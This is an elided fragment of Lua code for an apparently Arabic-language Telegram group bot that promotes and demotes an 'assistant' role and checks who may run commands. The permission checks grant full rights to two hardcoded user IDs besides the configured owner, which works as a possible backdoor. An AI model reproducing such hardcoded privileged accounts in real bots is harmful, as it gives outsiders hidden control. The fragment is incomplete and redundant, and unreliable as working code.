...
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender_id.user_id,"• تم ترقيته مساعد مسبقا ").Reply,"md",true)  
else
...
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender_id.user_id,"• تم ترقيته  مساعد").Reply,"md",true)  
end
end
if text == 'تنزيل مساعد' then
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
...
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender_id.user_id,"• تم تنزيله مساعد مسبقا ").Reply,"md",true)  
else
Redis:del(Fast.."Specialall:Group")
...
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender_id.user_id,"• تم تنزيله مساعد").Reply,"md",true)  
end
end
...
YouCan = true
elseif tonumber(senderr) == tonumber(1121532100) then
YouCan = true
elseif tonumber(senderr) == tonumber(1121532100) then
YouCan = true
else
...
if tonumber(senderr) == tonumber(Sudo_Id) then
YouCan = true
elseif tonumber(senderr) == tonumber(5904216848) then
YouCan = true
elseif tonumber(senderr) == tonumber(5904216848) then
YouCan = true
else
